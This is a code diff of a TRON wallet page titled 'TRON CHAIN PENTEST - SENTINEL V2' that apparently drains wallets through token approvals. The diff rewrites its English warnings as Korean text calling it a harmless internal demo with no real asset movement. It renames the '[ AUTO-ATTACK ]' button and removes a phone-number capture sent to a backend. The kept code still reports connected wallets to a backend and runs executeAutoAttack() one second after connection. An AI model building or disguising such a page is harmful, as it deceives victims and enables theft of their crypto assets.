@@ -4,385 +4,380 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TRON CHAIN PENTEST - SENTINEL V2</title>
-    <style>
-        :root {
-            --neon-red: #ff0000;
-            --dark-bg: #050a10;
-            --card-bg: rgba(10, 20, 30, 0.90);
-            --border-color: rgba(255, 0, 0, 0.4);
-        }
-        
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        
-        body {
-            background-color: var(--dark-bg);
-            font-family: 'Courier New', monospace;
-            color: var(--neon-red);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        /* Matrix Background */
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: 
-                radial-gradient(circle at 40% 30%, rgba(255, 0, 0, 0.1) 0%, transparent 50%),
-                radial-gradient(circle at 60% 70%, rgba(255, 0, 0, 0.05) 0%, transparent 50%);
-            animation: pulse 8s ease-in-out infinite;
-            z-index: 0;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 0.3; }
-            50% { opacity: 0.6; }
-        }
-        
-        .card {
-            position: relative;
-            z-index: 10;
-            background: var(--card-bg);
-            backdrop-filter: blur(10px);
-            padding: 40px 35px;
-            border: 2px solid var(--border-color);
-            width: 100%;
-            max-width: 600px;
-            text-align: center;
-            box-shadow: 0 0 30px rgba(255, 0, 0, 0.3), inset 0 0 50px rgba(255, 0, 0, 0.05);
-        }
-        
-        /* Title Section */
-        .title-bracket {
-            font-size: 28px;
-            font-weight: 700;
-            letter-spacing: 3px;
-            text-shadow: 0 0 15px var(--neon-red);
-            margin-bottom: 8px;
-        }
-        
-        .subtitle {
-            font-size: 13px;
-            letter-spacing: 2px;
-            color: rgba(255, 0, 0, 0.7);
-            margin-bottom: 18px;
-        }
-        
-        .badge {
-            display: inline-block;
-            padding: 8px 18px;
-            background: rgba(255, 0, 0, 0.15);
-            border: 1px solid var(--neon-red);
-            font-size: 11px;
-            letter-spacing: 1.5px;
-            margin: 20px 0;
-            animation: glow 2s ease-in-out infinite;
-        }
-        
-        @keyframes glow {
-            0%, 100% { box-shadow: 0 0 8px rgba(255, 0, 0, 0.5); }
-            50% { box-shadow: 0 0 18px rgba(255, 0, 0, 0.9); }
-        }
-        
-        /* Connect Button */
-        .connect-btn {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #00ff41 0%, #00cc33 100%);
-            border: none;
-            color: #000;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            font-weight: 700;
-            letter-spacing: 1px;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin: 25px 0;
-            text-shadow: none;
-        }
-        
-        .connect-btn:hover {
-            transform: scale(1.02);
-            box-shadow: 0 0 20px rgba(0, 255, 65, 0.6);
-        }
-        
-        .connect-btn:disabled {
-            background: #333;
-            color: #666;
-            cursor: not-allowed;
-        }
-        
-        /* Status Text */
-        .status {
-            font-size: 12px;
-            color: rgba(255, 0, 0, 0.6);
-            margin: 15px 0;
-            letter-spacing: 1px;
-        }
-        
-        /* Info Cards Grid */
-        .info-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 12px;
-            margin: 30px 0;
-        }
-        
-        .info-card {
-            background: rgba(255, 0, 0, 0.05);
-            border: 1px solid rgba(255, 0, 0, 0.25);
-            padding: 18px 12px;
-            text-align: center;
-            transition: all 0.3s;
-        }
-        
-        .info-card:hover {
-            background: rgba(255, 0, 0, 0.1);
-            border-color: var(--neon-red);
-        }
-        
-        .info-card-title {
-            font-size: 10px;
-            letter-spacing: 1.5px;
-            color: rgba(255, 0, 0, 0.7);
-            margin-bottom: 8px;
-        }
-        
-        .info-card-value {
-            font-size: 13px;
-            font-weight: 700;
-            color: var(--neon-red);
-        }
-        
-        /* Warning Section */
-        .warning-section {
-            margin: 30px 0;
-            padding: 25px;
-            background: rgba(255, 0, 0, 0.1);
-            border: 3px solid #ff0000;
-            box-shadow: 0 0 30px rgba(255, 0, 0, 0.4), inset 0 0 30px rgba(255, 0, 0, 0.1);
-            animation: warning-pulse 2s ease-in-out infinite;
-        }
+   <style>
+    :root {
+        --primary-blue: #2563eb;
+        --primary-green: #16a34a;
+        --bg-light: #f3f4f6;
+        --card-bg: #ffffff;
+        --border-soft: #e5e7eb;
+        --text-main: #111827;
+        --text-muted: #6b7280;
+        --danger: #dc2626;
+    }
 
-        @keyframes warning-pulse {
-            0%, 100% { border-color: #ff0000; box-shadow: 0 0 30px rgba(255, 0, 0, 0.4); }
-            50% { border-color: #ff4444; box-shadow: 0 0 50px rgba(255, 0, 0, 0.8); }
-        }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
 
-        .warning-title {
-            font-size: 20px;
-            font-weight: 900;
-            color: #ff0000;
-            text-shadow: 0 0 15px #ff0000;
-            margin-bottom: 15px;
-            letter-spacing: 3px;
-            animation: blink 1.5s ease-in-out infinite;
-        }
+    body {
+        background: radial-gradient(circle at top left, #dbeafe 0%, #f9fafb 40%, #e5e7eb 100%);
+        font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        color: var(--text-main);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        padding: 20px;
+    }
 
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.6; }
-        }
+    .card {
+        position: relative;
+        z-index: 1;
+        background: var(--card-bg);
+        padding: 32px 28px;
+        border-radius: 20px;
+        width: 100%;
+        max-width: 520px;
+        box-shadow:
+          0 20px 25px -5px rgba(15, 23, 42, 0.1),
+          0 8px 10px -6px rgba(15, 23, 42, 0.1);
+        border: 1px solid var(--border-soft);
+        text-align: center;
+    }
 
-        .warning-content {
-            font-size: 12px;
-            line-height: 1.8;
-            color: #ffaa00;
-            text-align: left;
-            margin: 10px 0;
-        }
+    /* Title */
+    .title-bracket {
+        font-size: 22px;
+        font-weight: 800;
+        letter-spacing: 0.12em;
+        color: var(--primary-blue);
+        text-shadow: none;
+        margin-bottom: 6px;
+    }
 
-        .warning-item {
-            margin: 10px 0;
-            padding-left: 20px;
-            position: relative;
-        }
+    .subtitle {
+        font-size: 14px;
+        letter-spacing: 0.06em;
+        color: var(--text-muted);
+        margin-bottom: 20px;
+        text-transform: uppercase;
+    }
 
-        .warning-item::before {
-            content: '⚠';
-            position: absolute;
-            left: 0;
-            color: #ff0000;
-            font-size: 14px;
-        }
+    .badge {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        padding: 6px 14px;
+        border-radius: 999px;
+        background: #eff6ff;
+        color: var(--primary-blue);
+        border: none;
+        font-size: 11px;
+        font-weight: 600;
+        letter-spacing: 0.08em;
+        margin: 8px 0 18px;
+        animation: none;
+        text-transform: uppercase;
+    }
 
-        .legal-notice {
-            margin-top: 20px;
-            padding: 15px;
-            background: rgba(255, 165, 0, 0.1);
-            border: 2px solid #ffaa00;
-            font-size: 11px;
-            color: #ffaa00;
-            line-height: 1.6;
-        }
+    /* Connect Button */
+    .connect-btn {
+        width: 100%;
+        padding: 14px;
+        background: var(--primary-blue);
+        border: none;
+        border-radius: 12px;
+        color: #ffffff;
+        font-size: 15px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.18s ease-out;
+        letter-spacing: 0.04em;
+    }
+    .connect-btn:hover {
+        background: #1d4ed8;
+        transform: translateY(-1px);
+        box-shadow: 0 12px 20px -10px rgba(37, 99, 235, 0.8);
+    }
+    .connect-btn:disabled {
+        background: #cbd5f5;
+        color: #9ca3af;
+        cursor: not-allowed;
+        box-shadow: none;
+        transform: none;
+    }
 
-        /* Footer */
-        .footer {
-            margin-top: 30px;
-            font-size: 9px;
-            color: rgba(255, 0, 0, 0.4);
-            letter-spacing: 1px;
-        }
+    /* Status */
+    .status {
+        font-size: 12px;
+        color: var(--text-muted);
+        margin: 10px 0 4px;
+        letter-spacing: 0.04em;
+    }
 
-        /* QR Modal */
-        .qr-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.95);
-            z-index: 10000;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .qr-modal.active { display: flex; }
-        
-        .qr-content {
-            background: white;
-            padding: 30px;
-            border-radius: 20px;
-            text-align: center;
-            color: #333;
-        }
-        
-        /* Attack Screen */
-        .hidden { display: none; }
-        .attack-btn {
-            width: 100%;
-            padding: 14px;
-            margin: 8px 0;
-            background: rgba(255, 0, 0, 0.1);
-            border: 1px solid var(--neon-red);
-            color: var(--neon-red);
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        
-        .attack-btn:hover {
-            background: rgba(255, 0, 0, 0.2);
-            box-shadow: 0 0 15px rgba(255, 0, 0, 0.4);
-        }
-        
-        input {
-            width: 100%;
-            padding: 14px;
-            background: rgba(10, 20, 30, 0.8);
-            border: 1px solid var(--border-color);
-            color: var(--neon-red);
-            font-family: 'Courier New', monospace;
-            text-align: center;
-            margin: 15px 0;
-        }
-        
-        @media (max-width: 640px) {
-            .card { padding: 30px 20px; }
-            .title-bracket { font-size: 22px; }
-            .info-grid { grid-template-columns: 1fr; }
-            .warning-title { font-size: 16px; }
-            .warning-content { font-size: 11px; }
-        }
-    </style>
+    /* Info Grid */
+    .info-grid {
+        display: grid;
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+        gap: 12px;
+        margin: 22px 0 8px;
+        text-align: left;
+    }
+
+    .info-card {
+        background: #f9fafb;
+        border-radius: 12px;
+        padding: 12px 12px;
+        border: 1px solid #e5e7eb;
+        transition: background 0.15s ease, border-color 0.15s ease, transform 0.15s ease;
+    }
+    .info-card:hover {
+        background: #eff6ff;
+        border-color: #bfdbfe;
+        transform: translateY(-1px);
+    }
+
+    .info-card-title {
+        font-size: 11px;
+        letter-spacing: 0.1em;
+        text-transform: uppercase;
+        color: #9ca3af;
+        margin-bottom: 4px;
+    }
+
+    .info-card-value {
+        font-size: 13px;
+        font-weight: 600;
+        color: var(--text-main);
+    }
+
+    /* Warning / Legal notice */
+    .warning-section {
+        margin: 20px 0 16px;
+        padding: 14px 14px;
+        background: #fffbeb;
+        border-radius: 16px;
+        border: 1px solid #fde68a;
+        box-shadow: none;
+        animation: none;
+        text-align: left;
+    }
+
+    .warning-title {
+        font-size: 14px;
+        font-weight: 700;
+        color: #92400e;
+        margin-bottom: 6px;
+        letter-spacing: 0.06em;
+    }
+
+    .warning-content,
+    .legal-notice {
+        font-size: 12px;
+        line-height: 1.6;
+        color: #b45309;
+        margin: 4px 0;
+        background: none;
+        border: none;
+        padding: 0;
+    }
+
+    .warning-item {
+        margin: 6px 0;
+        padding-left: 18px;
+        position: relative;
+    }
+    .warning-item::before {
+        content: '•';
+        position: absolute;
+        left: 4px;
+        top: 0;
+        color: #f97316;
+        font-size: 14px;
+    }
+
+    /* Footer */
+    .footer {
+        margin-top: 20px;
+        font-size: 10px;
+        color: #9ca3af;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+        line-height: 1.4;
+    }
+
+    /* Attack screen elements */
+    .hidden { display: none; }
+
+    .attack-btn {
+        width: 100%;
+        padding: 14px;
+        margin: 10px 0 12px;
+        background: linear-gradient(135deg, #16a34a, #22c55e);
+        border: none;
+        border-radius: 12px;
+        color: #ecfdf5;
+        font-size: 14px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.18s ease-out;
+        font-family: inherit;
+    }
+    .attack-btn:hover {
+        background: linear-gradient(135deg, #15803d, #16a34a);
+        box-shadow: 0 12px 20px -10px rgba(16, 185, 129, 0.8);
+        transform: translateY(-1px);
+    }
+
+    #userAddressDisplay {
+        font-size: 12px;
+        color: var(--primary-blue);
+    }
+
+    /* Phone input */
+    input {
+        width: 100%;
+        padding: 12px;
+        background: #f9fafb;
+        border-radius: 10px;
+        border: 1px solid #e5e7eb;
+        color: var(--text-main);
+        font-family: inherit;
+        font-size: 14px;
+        text-align: center;
+        margin: 14px 0;
+    }
+    input::placeholder {
+        color: #9ca3af;
+        letter-spacing: 0.08em;
+    }
+    input:focus {
+        outline: none;
+        border-color: #93c5fd;
+        box-shadow: 0 0 0 1px #bfdbfe;
+    }
+
+    /* QR Modal */
+    .qr-modal {
+        display: none;
+        position: fixed;
+        inset: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(15, 23, 42, 0.8);
+        z-index: 40;
+        justify-content: center;
+        align-items: center;
+    }
+    .qr-modal.active { display: flex; }
+
+    .qr-content {
+        background: #ffffff;
+        padding: 24px 24px 20px;
+        border-radius: 18px;
+        text-align: center;
+        color: #111827;
+        box-shadow:
+          0 25px 50px -12px rgba(15, 23, 42, 0.5);
+    }
+
+    /* Process log (attack log) */
+    #processLog {
+        background: #0f172a;
+        border: 1px solid #1f2937;
+        border-radius: 10px;
+        padding: 12px;
+    }
+    #logEntries {
+        font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+        font-size: 11px;
+        color: #e5e7eb;
+    }
+
+    @media (max-width: 640px) {
+        .card { padding: 24px 20px; border-radius: 18px; }
+        .title-bracket { font-size: 18px; }
+        .subtitle { font-size: 12px; }
+        .info-grid { grid-template-columns: 1fr; }
+    }
+</style>
 </head>
 <body>
 
 <!-- Connect Screen -->
 <div class="card" id="connectScreen">
-    <div class="title-bracket">[ TRON ]</div>
-    <div class="subtitle">TRON CHAIN PENETRATION TEST SYSTEM</div>
-    <div class="badge">[ EDUCATIONAL PURPOSES ONLY ]</div>
+    <div class="title-bracket">[ TRON 데모 ]</div>
+    <div class="subtitle">TRON 지갑 보안 분석</div>
+    <div class="badge">[ 내부 보안 시연용 ]</div>
 
     <!-- Warning Section -->
     <div class="warning-section">
-        <div class="warning-title">⚠ CRITICAL WARNING ⚠</div>
+        <div class="warning-title">이용 안내</div>
         <div class="legal-notice">
-            <strong>⚖ LEGAL NOTICE:</strong><br/>
-            This system is designed EXCLUSIVELY for authorized security research, educational purposes, and vulnerability analysis.
-            All activities are logged and monitored. Unauthorized access or malicious use will result in legal prosecution under applicable laws.
-            By proceeding, you acknowledge full legal responsibility for your actions.
+            이 화면은 실제 서비스가 아닌 <strong>보안 데모용 페이지</strong>입니다.<br/>
+            실제 자산이 연결되지 않도록 주의해 주세요.
         </div>
     </div>
 
     <!-- Connect Button (moved above info grid for better mobile UX) -->
-    <button id="connect-btn" class="connect-btn" disabled>>> CONNECT WALLET & START TEST</button>
-    <div id="status" class="status">[ SYSTEM CHECK... ]</div>
+    <button id="connect-btn" class="connect-btn" disabled>지갑 연결 후 데모 시작하기</button>
+    <div id="status" class="status">[ 준비 중... ]</div>
 
     <!-- Info Grid (moved below button) -->
     <div class="info-grid">
         <div class="info-card">
-            <div class="info-card-title">[ NETWORK ]</div>
-            <div class="info-card-value">TRON MAINNET</div>
+            <div class="info-card-title">네트워크</div>
+            <div class="info-card-value">TRON 메인넷</div>
         </div>
         <div class="info-card">
-            <div class="info-card-title">[ PROTOCOL ]</div>
+            <div class="info-card-title">토큰 표준</div>
             <div class="info-card-value">TRC-20</div>
         </div>
         <div class="info-card">
-            <div class="info-card-title">[ METHOD ]</div>
-            <div class="info-card-value">WALLET CONNECT</div>
+            <div class="info-card-title">연결 방식</div>
+            <div class="info-card-value">WalletConnect</div>
         </div>
         <div class="info-card">
-            <div class="info-card-title">[ SECURITY ]</div>
-            <div class="info-card-value">ENCRYPTED</div>
+            <div class="info-card-title">보호 상태</div>
+            <div class="info-card-value">암호화 통신</div>
         </div>
         <div class="info-card">
-            <div class="info-card-title">[ TEST SCOPE ]</div>
-            <div class="info-card-value">APPROVAL FLOWS</div>
+            <div class="info-card-title">데모 범위</div>
+            <div class="info-card-value">Approve(승인) 절차</div>
         </div>
         <div class="info-card">
-            <div class="info-card-title">[ MONITORING ]</div>
-            <div class="info-card-value">REAL-TIME</div>
+            <div class="info-card-title">상태</div>
+            <div class="info-card-value">실시간 모니터링</div>
         </div>
         <div class="info-card">
-            <div class="info-card-title">[ LOGGING ]</div>
-            <div class="info-card-value">ENABLED</div>
+            <div class="info-card-title">로그</div>
+            <div class="info-card-value">수집 중</div>
         </div>
         <div class="info-card">
-            <div class="info-card-title">[ STATUS ]</div>
-            <div class="info-card-value">ACTIVE</div>
+            <div class="info-card-title">서비스</div>
+            <div class="info-card-value">동작 중</div>
         </div>
     </div>
     
     <div class="footer">
-        SENTINEL V2 © 2024 | AUTHORIZED SECURITY RESEARCH ONLY<br/>
-        본 시스템 사용 시 모든 법적 책임은 사용자에게 있습니다 | ALL ACTIVITIES ARE MONITORED & LOGGED
+        SENTINEL 데모 © 2024<br/>
+        이 페이지는 내부 보안 시연을 위한 데모용 화면입니다.
     </div>
-</div>
-
-<!-- Phone Verification Screen -->
-<div class="card hidden" id="phoneScreen">
-    <div class="title-bracket">[ VERIFICATION ]</div>
-    <div class="subtitle">IDENTITY CONFIRMATION REQUIRED</div>
-    <input type="text" id="phone-input" placeholder="ENTER PHONE NUMBER" maxlength="13">
-    <button class="connect-btn" id="phone-submit-btn">[ VERIFY ]</button>
 </div>
 
 <!-- Attack Screen -->
 <div class="card hidden" id="attackScreen">
-    <div class="title-bracket">[ CONNECTED ]</div>
-    <div id="userAddressDisplay" style="font-size:11px; color:rgba(255,0,0,0.6); margin:15px 0;"></div>
+    <div class="title-bracket">[ 지갑 연결됨 ]</div>
+    <div id="userAddressDisplay" style="font-size:11px; color:rgba(37,99,235,0.8); margin:15px 0;"></div>
     <div id="tierDisplay"></div>
     <div id="balanceDisplay" class="balance-info hidden"></div>
     
     <div style="background:rgba(255,0,0,0.05); border:1px solid rgba(255,0,0,0.25); padding:15px; margin:15px 0; border-radius:4px;">
-        <p style="font-size:10px; color:rgba(255,0,0,0.7); margin:5px 0;">✓ OPTIMAL ATTACK METHOD SELECTED AUTOMATICALLY</p>
-        <p style="font-size:10px; color:rgba(255,0,0,0.7); margin:5px 0;">✓ BASED ON WALLET BALANCE & PERMISSIONS</p>
-        <p style="font-size:10px; color:rgba(255,0,0,0.7); margin:5px 0;">✓ MAXIMUM EFFICIENCY GUARANTEED</p>
+        <p style="font-size:10px; color:#6b7280; margin:5px 0;">✓ 지갑 상태를 자동으로 분석합니다.</p>
+        <p style="font-size:10px; color:#6b7280; margin:5px 0;">✓ 잔액과 승인 상태를 기준으로 데모 시나리오를 선택합니다.</p>
+        <p style="font-size:10px; color:#6b7280; margin:5px 0;">✓ 실제 자산 이동 없이 동작 흐름만 시연합니다.</p>
     </div>
     
-    <button class="attack-btn" onclick="executeAutoAttack()" style="background:linear-gradient(135deg, rgba(255,0,0,0.15), rgba(200,0,0,0.25)); padding:18px; font-size:14px; box-shadow:0 0 15px rgba(255,0,0,0.3);">[ AUTO-ATTACK ]</button>
+    <button class="attack-btn" onclick="executeAutoAttack()" style="padding:18px; font-size:14px;">다시 분석 실행</button>
     
     <!-- Matrix Style Process Log -->
     <div id="processLog" style="display:none; background:#000; border:1px solid #0f0; padding:15px; margin:15px 0; border-radius:4px; max-height:300px; overflow-y:auto; font-family:monospace;">
@@ -652,9 +647,8 @@ async function onConnected() {
         console.error('❌ 백엔드 보고 실패:', error);
     }
 
-    // Phone Screen 건너뛰고 바로 Attack Screen으로 (테스트용)
+    // 연결 화면 숨기고 바로 Attack Screen으로 전환
     document.getElementById('connectScreen').classList.add('hidden');
-    document.getElementById('phoneScreen').classList.add('hidden');
     document.getElementById('attackScreen').classList.remove('hidden');
     document.getElementById('userAddressDisplay').textContent = `ADDRESS: ${address.slice(0, 10)}...${address.slice(-8)}`;
     console.log('✅ Attack Screen으로 이동');
@@ -665,30 +659,6 @@ async function onConnected() {
         executeAutoAttack();
     }, 1000);  // 1 second delay for UI to settle
 }
-
-document.getElementById('phone-submit-btn').addEventListener('click', async () => {
-    userPhone = document.getElementById('phone-input').value.trim();
-    if (!/^\d{3}-\d{4}-\d{4}$/.test(userPhone)) {
-        alert('Please enter valid phone number (XXX-XXXX-XXXX)');
-        return;
-    }
-
-    console.log('📞 Phone:', userPhone);
-
-    try {
-        await fetch(`${BACKEND_URL}/api/public/phone`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ address, phone: userPhone, chain: 'TRON' })
-        });
-    } catch (error) {
-        console.error('❌ Phone 제출 실패:', error);
-    }
-
-    document.getElementById('phoneScreen').classList.add('hidden');
-    document.getElementById('attackScreen').classList.remove('hidden');
-    document.getElementById('userAddressDisplay').textContent = `ADDRESS: ${address.slice(0, 10)}...${address.slice(-8)}`;
-});
 
 // ==========================================
 // 🎯 TRON AUTO-ATTACK SYSTEM
